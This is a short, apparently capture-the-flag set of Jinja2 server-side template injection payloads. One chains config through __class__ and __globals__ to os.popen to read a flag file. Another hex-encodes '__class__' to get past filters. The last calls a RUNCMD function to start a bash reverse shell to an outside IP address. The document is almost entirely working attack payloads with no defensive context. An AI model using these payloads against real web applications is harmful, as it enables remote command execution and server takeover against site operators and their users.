{{ 
	config|
	attr("__class__")| 
	attr("__init__")|
	attr("__globals__['os']")|
	attr("popen(['cat flag', [1|float|string|list][0][1], 'txt']|join)")|
	attr("read()")
}}

becomes {{""["5F5F636C6173735F5F"["decode"]("hex")]}



{{ config['RUNCMD']('bash -i >& /dev/tcp/5.18.171.149/8000 0>&1',shell=True) }}